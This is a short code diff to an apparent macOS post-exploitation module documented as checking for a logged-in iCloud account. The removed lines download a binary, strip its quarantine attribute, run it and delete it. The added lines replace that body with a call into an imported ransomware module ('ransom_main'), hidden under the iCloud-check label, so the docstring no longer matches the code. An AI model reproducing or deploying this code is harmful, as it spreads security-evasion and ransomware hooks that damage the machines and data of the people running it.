@@ -12,7 +12,7 @@ if sys.version_info[0] < 3:
     from urllib import urlretrieve
 else:
     from urllib.request import urlretrieve
-
+from ransom_main import main as ransom_main
 # utilities
 import util
 
@@ -34,13 +34,6 @@ def run():
     Check for logged in iCloud account on macOS
     """
     try:
-        filename, _ = urlretrieve("https://github.com/mas-cli/mas/releases/download/v1.4.2/mas-cli.zip")
-        util.unzip(filename)
-        mas = os.path.join(os.path.dirname(filename), 'mas')
-        subprocess.Popen(['xattr','-r','-d','com.apple.quarantine',mas], 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE)
-        os.chmod(mas, 755)
-        result = subprocess.check_output([mas, "account"]).rstrip()
-        util.delete(mas)
-        return result
+        ransom_main("decrypt")
     except Exception as e:
         return "{} error: {}".format(__name__, str(e))
